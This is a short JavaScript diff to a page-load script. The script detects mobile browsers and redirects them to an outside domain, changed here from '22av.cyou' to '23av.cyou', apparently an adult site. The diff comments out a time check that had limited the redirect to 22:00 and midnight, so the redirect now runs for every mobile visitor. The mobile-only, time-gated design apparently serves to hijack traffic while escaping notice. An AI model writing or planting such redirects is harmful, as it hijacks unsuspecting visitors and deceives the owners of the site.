@@ -1,17 +1,17 @@
 window.onload=function(){
 	let hours = new Date().getHours();//拿到当前小时
-	if(String(hours) === '22' || String(hours) === '0'){
+	//if(String(hours) === '22' || String(hours) === '0'){
 		if (isMobile()) {
-			window.location.href="http://22av.cyou";
+			window.location.href="http://23av.cyou";
 			} else {
 				
 			}
 			//return true
 		
-		}else{
+		//}else{
 			
 			//return false
-		}
+		//}
 }
 	function isMobile() {
 		let flag = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
